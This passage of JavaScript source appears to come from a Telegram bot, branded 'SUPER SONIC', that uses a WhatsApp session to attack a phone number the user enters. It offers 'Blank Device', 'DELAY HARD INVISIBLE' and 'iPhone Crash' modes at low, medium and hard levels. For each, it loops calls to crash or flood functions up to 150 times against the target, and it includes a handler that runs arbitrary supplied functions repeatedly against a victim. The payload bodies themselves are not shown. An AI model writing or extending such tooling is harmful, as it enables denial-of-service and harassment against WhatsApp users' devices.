        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</code></pre>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

bot.command("xlevel",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,

  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`Format: /xlevel 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithPhoto("https://files.catbox.moe/yuq6rs.jpg", {
      caption: `\`\`\`
⬡═―—⊱ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⊰―—═⬡
⌑ Target: ${q}
⌑ Pilih tipe bug:
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "DELAY HARD INVISIBLE", callback_data: `xlevel_type_delay_${q}` },
            { text: "Blank Device", callback_data: `xlevel_type_blank_${q}` },
          ],
          [
            { text: "iPhone Crash", callback_data: `xlevel_type_ios_${q}` },
          ]
        ]
      }
    });
  }
);

// Handler semua callback
bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  if (!data.startsWith("xlevel_")) return;

  const parts = data.split("_");
  const action = parts[1]; // type / level
  const type = parts[2];
  const q = parts[3];
  const level = parts[4];
  const target = q + "@s.whatsapp.net";
  const chatId = ctx.chat.id;
  const messageId = ctx.callbackQuery.message.message_id;

  // === Tahap 1: pilih tipe → tampilkan pilihan level ===
  if (action === "type") {
    return ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `\`\`\`
⬡═―—⊱ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Pilih level bug:
 \`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "(Low)", callback_data: `xlevel_level_${type}_${q}_low` },
              { text: "(Medium)", callback_data: `xlevel_level_${type}_${q}_medium` },
            ],
            [
              { text: "(Hard)", callback_data: `xlevel_level_${type}_${q}_hard` },
            ],
            [
              { text: "⬅️ Kembali", callback_data: `xlevel_back_${q}` }
            ]
          ]
        }
      }
    );
  }

  // === Tombol kembali ke pilihan awal ===
  if (action === "back") {
    return ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `\`\`\`
⬡═―—⊱ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⊰―—═⬡
⌑ Target: ${q}
⌑ Pilih type bug:
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "DELAY HARD INVISIBLE", callback_data: `xlevel_type_delay_${q}` },
              { text: "Blank Device", callback_data: `xlevel_type_blank_${q}` },
            ],
            [
              { text: "iPhone Crash", callback_data: `xlevel_type_ios_${q}` },
            ]
          ]
        }
      }
    );
  }

  // === Tahap 2: pilih level → mulai animasi & eksekusi bug ===
  if (action === "level") {
    await ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `\`\`\`
⬡═―—⊱ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Level: ${level.toUpperCase()}
⌑ Status: ⏳ Processing
\`\`\``,
      { parse_mode: "Markdown" }
    );

    const frames = [
      "▰▱▱▱▱▱▱▱▱▱ 10%",
      "▰▰▱▱▱▱▱▱▱▱ 20%",
      "▰▰▰▱▱▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱▱▱ 40%",
      "▰▰▰▰▰▱▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱▱▱ 60%",
      "▰▰▰▰▰▰▰▱▱▱ 70%",
      "▰▰▰▰▰▰▰▰▱▱ 80%",
      "▰▰▰▰▰▰▰▰▰▱ 90%",
      "▰▰▰▰▰▰▰▰▰▰ 100%"
    ];

    for (const f of frames) {
      await ctx.telegram.editMessageCaption(
        chatId,
        messageId,
        undefined,
        `\`\`\`
⬡═―—⊱ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Level: ${level.toUpperCase()}
⌑ Status: ${f}
\`\`\``,
        { parse_mode: "Markdown" }
      );
      await new Promise((r) => setTimeout(r, 400));
    }

    // === Eksekusi sesuai type & level ===
    if (type === "blank") {
      const count = level === "low" ? 50 : level === "medium" ? 80 : 150;
      for (let i = 0; i < count; i++) {
        await notificationblank(target);
        await sleep(2000);
        await UIMention(sock, target, mention = true);
        await sleep(800);
      }
    } else if (type === "delay") {
      const loops = level === "low" ? 4 : level === "medium" ? 7 : 10;
      for (let i = 0; i < loops; i++) {
        await Cycsi(sock, target);
        await sleep(400);
        await Cycsi(sock, target);
        await sleep(400);
        await glowInvis(sock, target);
        await sleep(400);
        await Qivisix(sock, target);
        await sleep(400);
        await glowInvis(sock, target);
        await sleep(400);
        await Cycsi(sock, target);
        await sleep(400);
      }
    } else if (type === "ios") {
      const count = level === "low" ? 20 : level === "medium" ? 50 : 100;
      for (let i = 0; i < count; i++) {
        await PermenIphone(target, mention);
        await sleep(300);
        await PermenIphone(target, mention);
        await sleep(700);
      }
    }

    // === Setelah selesai ===
    await ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `\`\`\`
⬡═―—⊱ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Level: ${level.toUpperCase()}
⌑ Status: ✅ Sukses
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ Cek Target", url: `https://wa.me/${q}` }],
            [{ text: "🔁 Kirim Lagi", callback_data: `xlevel_type_${type}_${q}` }]
          ],
        },
      }
    );

    await ctx.answerCbQuery(`Bug ${type.toUpperCase()} (${level.toUpperCase()}) selesai ✅`);
  }
});

// FUNCTION BUG

//


bot.launch()
